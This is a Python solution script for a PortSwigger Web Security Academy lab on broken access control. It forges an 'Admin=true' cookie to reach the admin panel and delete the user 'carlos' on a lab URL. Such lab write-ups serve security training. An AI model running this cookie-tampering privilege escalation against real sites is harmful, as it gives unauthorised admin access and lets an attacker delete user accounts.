##########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 4/9/2023
#
# Lab: User role controlled by request parameter
#
# Steps: 1. Change the cookie 'Admin' to 'true'
#        2. Fetch the admin panel
#        3. Delete carlos
#
##########################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this to your lab URL
url = "https://0a69005f031d6f6781dd399b000b005a.web-security-academy.net"

try:
    # set session cookie
    cookies = {
        "Admin": "true"
    }

    print(Fore.WHITE + "1. Changing the cookie 'Admin' to 'true'.. " + Fore.GREEN + "OK")

    # fetch admin panel
    # this step is not necessary in the script, you can do step 2 directrly
    # it's a must only when solving the lab using the browser
    admin_panel = requests.get(f"{url}/admin", cookies=cookies)
    
    if admin_panel.status_code == 200:
        print(Fore.WHITE + "2. Fetching the admin panel.. " + Fore.GREEN + "OK")

        try:  
            # delete the carlos
            delete_carlos = requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
            
            if delete_carlos.status_code == 200:
                print(Fore.WHITE + "3. Deleting carlos.. " + Fore.GREEN + "OK")
                
                print(Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
            
            else:
                print(Fore.RED + "[!] Failed to delete carlos")
        
        except:
            print(Fore.RED + "[!] Failed to delete carlos through exception")
    
    else:
        print(Fore.RED + "[!] Failed to fetch admin panel")

except:
    print(Fore.RED + "[!] Failed to fetch admin panel through exception")
